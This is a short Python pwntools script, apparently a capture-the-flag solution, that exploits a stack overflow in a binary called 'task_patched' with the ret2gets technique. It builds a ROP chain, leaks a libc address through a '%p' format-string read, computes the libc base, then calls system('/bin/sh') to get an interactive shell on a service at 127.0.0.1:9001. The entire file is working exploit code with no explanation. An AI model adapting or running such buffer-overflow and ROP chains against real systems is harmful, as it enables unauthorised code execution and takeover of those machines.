#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.binary = elf
#context.terminal = ["ghostty", "-e"]

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

rop = ROP(elf)
rop.raw(b"A" * 0x28)
rop.call("gets")
rop.call("gets")
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("printf")
rop.call("gift")
p.sendline(rop.chain())

p.readline()

p.sendline(b"\x01")

p.sendline(b"AAAAAA.%p")
leak = int(p.recv().decode().split(".")[1], 16)
libc.address = leak - 0x203963 # libc specific

rop = ROP(libc)
rop.raw(b"A" * 0x28)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.call("system")
p.sendline(rop.chain())

p.interactive()

# https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets
